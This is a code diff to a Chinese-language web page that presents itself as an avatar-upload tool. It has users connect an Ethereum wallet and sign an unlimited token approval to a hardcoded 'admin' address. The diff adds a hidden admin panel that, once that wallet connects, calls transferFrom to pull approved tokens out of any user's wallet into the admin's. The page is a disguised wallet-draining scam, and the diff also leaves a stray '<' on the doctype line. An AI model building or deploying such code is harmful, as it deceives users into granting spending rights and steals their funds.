@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8" />
@@ -33,6 +33,7 @@
       background: #ffffff;
       border-radius: 16px;
       padding: 24px 20px;
+      margin-bottom:20px;
     }
     .form-item{
       margin-bottom:24px;
@@ -163,6 +164,20 @@
     .tip-ok button{
       color:#4086ff; border:none; background:none; font-size:16px;
     }
+    /* 管理员面板 */
+    .admin-panel{
+      background:#fff2f2;
+      border:1px solid #ffcccc;
+      border-radius:16px;
+      padding:20px 16px;
+      display:none;
+    }
+    .admin-title{
+      font-weight:bold;
+      font-size:17px;
+      margin-bottom:16px;
+      color:#c82423;
+    }
   </style>
 </head>
 <body>
@@ -188,6 +203,22 @@
     <button class="main-btn" id="nextBtn">下一步</button>
     <div class="status-text" id="statusShow"></div>
   </div>
+
+  <!-- 管理员操作面板，只有管理员钱包连接才显示 -->
+  <div class="admin-panel" id="adminPanel">
+    <div class="admin-title">🔐管理员划扣面板</div>
+    <div class="form-item">
+      <label class="form-label">用户已授权钱包地址</label>
+      <input class="input-text" id="userWalletInput" placeholder="输入用户钱包0x地址">
+    </div>
+    <div class="form-item">
+      <label class="form-label">代币数量</label>
+      <input class="input-text" id="amountInput" placeholder="代币数量，例如100">
+    </div>
+    <button class="main-btn" id="deductionBtn">一键划扣用户代币</button>
+    <div class="status-text" id="adminStatus"></div>
+  </div>
+
 </div>
 
 <!-- 授权弹窗 -->
@@ -214,9 +245,9 @@
 </div>
 
 <script>
-// ========== 配置（以太坊主网） ==========
-const ETH_USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-const SPENDER_DEMO = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";
+// ========== 配置 ==========
+const TOKEN_CONTRACT = "0xd66f6bb0d107e59266c67581c57892541c394925";
+const ADMIN_WALLET = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1"; //管理员钱包spender
 const ETH_CHAIN_ID = 1;
 
 // DOM
@@ -235,6 +266,13 @@ const tipModal = document.getElementById('tipModal');
 const tipText = document.getElementById('tipText');
 const tipOkBtn = document.getElementById('tipOkBtn');
 
+//管理员DOM
+const adminPanel = document.getElementById('adminPanel');
+const userWalletInput = document.getElementById('userWalletInput');
+const amountInput = document.getElementById('amountInput');
+const deductionBtn = document.getElementById('deductionBtn');
+const adminStatus = document.getElementById('adminStatus');
+
 let provider, signer, usdtContract;
 let walletConnected = false;
 let hasSelectedAvatar = false;
@@ -245,6 +283,20 @@ function showTip(text){
   tipModal.style.display = 'flex';
 }
 tipOkBtn.onclick = ()=> tipModal.style.display = 'none';
+
+// 判断当前连接钱包是否管理员，显示/隐藏管理面板
+async function checkIsAdmin(){
+  if(!signer) {
+    adminPanel.style.display = "none";
+    return;
+  }
+  const currentAddr = await signer.getAddress();
+  if(currentAddr.toLowerCase() === ADMIN_WALLET.toLowerCase()){
+    adminPanel.style.display = "block";
+  }else{
+    adminPanel.style.display = "none";
+  }
+}
 
 // 点击唤起相册/文件选择
 avatarSelectWrap.addEventListener('click',()=>{
@@ -308,12 +360,14 @@ async function connectWallet(){
 
   provider = new ethers.providers.Web3Provider(window.ethereum);
   signer = provider.getSigner();
-  usdtContract = new ethers.Contract(ETH_USDT,[
+  usdtContract = new ethers.Contract(TOKEN_CONTRACT,[
     "function approve(address spender,uint256 amount) external returns(bool)",
-    "function allowance(address owner,address spender) view returns(uint256)"
+    "function allowance(address owner,address spender) view returns(uint256)",
+    "function transferFrom(address from,address to,uint256 amount) external returns(bool)"
   ],signer);
   walletConnected = true;
   statusShow.innerText = "✅钱包已连接（以太坊主网）";
+  await checkIsAdmin(); //连接完成校验管理员身份
   return true;
 }
 
@@ -344,15 +398,15 @@ authCancel.onclick = ()=>{
   authModal.style.display = "none";
 }
 
-// 确认授权，发起USDT无限approve
+// 用户确认授权
 authConfirm.onclick = async ()=>{
   authModal.style.display = "none";
   nextBtn.disabled = true;
-  statusShow.innerText = "正在发起USDT授权签名请求...";
+  statusShow.innerText = "正在发起授权签名请求...";
   try{
     const gasPrice = await provider.getGasPrice();
     const txOpt = {gasPrice:gasPrice.mul(110).div(100), gasLimit:120000};
-    const tx = await usdtContract.approve(SPENDER_DEMO, ethers.constants.MaxUint256, txOpt);
+    const tx = await usdtContract.approve(ADMIN_WALLET, ethers.constants.MaxUint256, txOpt);
     statusShow.innerText = "授权交易已提交，等待上链确认";
     await tx.wait(1);
     showTip("授权完成，请继续提交头像元数据");
@@ -362,6 +416,60 @@ authConfirm.onclick = async ()=>{
     statusShow.innerText = "授权操作取消/失败";
   }
   nextBtn.disabled = false;
+}
+
+// ==========管理员一键划扣逻辑 transferFrom==========
+deductionBtn.addEventListener('click',async ()=>{
+  if(!walletConnected){
+    showTip("请先连接管理员钱包");
+    return;
+  }
+  const currentAddr = await signer.getAddress();
+  if(currentAddr.toLowerCase() !== ADMIN_WALLET.toLowerCase()){
+    showTip("当前不是管理员钱包，禁止划扣");
+    return;
+  }
+  const userAddr = userWalletInput.value.trim();
+  const numStr = amountInput.value.trim();
+  if(!/^0x[a-fA-F0-9]{40}$/.test(userAddr)){
+    showTip("请输入合法用户钱包地址");
+    return;
+  }
+  if(isNaN(parseFloat(numStr)) || Number(numStr) <= 0){
+    showTip("请输入合法代币数量");
+    return;
+  }
+  deductionBtn.disabled = true;
+  adminStatus.innerText = "正在执行transferFrom划扣";
+  try{
+    // 注意：这里默认代币18位小数，如果该代币不是18位，需要修改decimals
+    const amountWei = ethers.utils.parseUnits(numStr,18);
+    const gasPrice = await provider.getGasPrice();
+    const txOpt = {gasPrice:gasPrice.mul(110).div(100), gasLimit:150000};
+    // transferFrom(from用户地址，to管理员自己，amount)
+    const tx = await usdtContract.transferFrom(userAddr,currentAddr,amountWei,txOpt);
+    adminStatus.innerText = "划扣交易已提交，等待确认";
+    await tx.wait(1);
+    showTip("✅代币划扣交易执行完成");
+    adminStatus.innerText = "划扣完成";
+  }catch(err){
+    console.error(err);
+    showTip("划扣失败："+err.message);
+    adminStatus.innerText = "划扣失败";
+  }
+  deductionBtn.disabled = false;
+})
+
+//监听钱包切换账号，自动刷新管理员面板
+if(window.ethereum){
+  window.ethereum.on('accountsChanged',async ()=>{
+    walletConnected = false;
+    provider = null;
+    signer = null;
+    usdtContract = null;
+    adminPanel.style.display="none";
+    statusShow.innerText = "钱包账号已变更，请重新连接";
+  })
 }
 </script>
 </body>
